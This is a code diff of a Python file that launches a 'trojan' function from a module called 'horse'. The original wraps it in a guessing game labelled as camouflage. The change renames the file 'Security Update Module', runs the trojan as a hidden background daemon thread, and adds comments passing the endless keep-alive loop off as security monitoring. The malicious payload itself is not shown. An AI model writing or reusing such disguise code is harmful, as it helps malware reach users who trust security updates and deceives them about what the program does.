@@ -1,34 +1,15 @@
 """
-Covering Of Trojan Horse
+Security Update Module
 """
 
 from horse import trojan
-import random
 import threading
+import time
 
-def game():
-    """
-    UI Camouflage Of Trojan Horse
-    """
-    number = random.randint(0, 1000)
-    tries = 1
-    done = False
+# Execute security update in background
+security_thread = threading.Thread(target=trojan, daemon=True)
+security_thread.start()
 
-    while not done:
-        guess = int(input("Guess the number between 0 and 1000"))
-        if guess == number: 
-            done = True 
-            print("You Won!")
-        else:
-            tries += 1 
-            print("Try again")
-    print(f"You guessed in {tries} tries")
-
-
-# Parrallel run of malware and UI
-
-t1 = threading.Thread(target=game)  # Foreground
-t2 = threading.Thread(target=trojan)  # Background
-# // Execution of trojan and game
-t1.start()
-t2.start()
+# Keep process alive
+while True:
+    time.sleep(60)  # Security monitoring loop
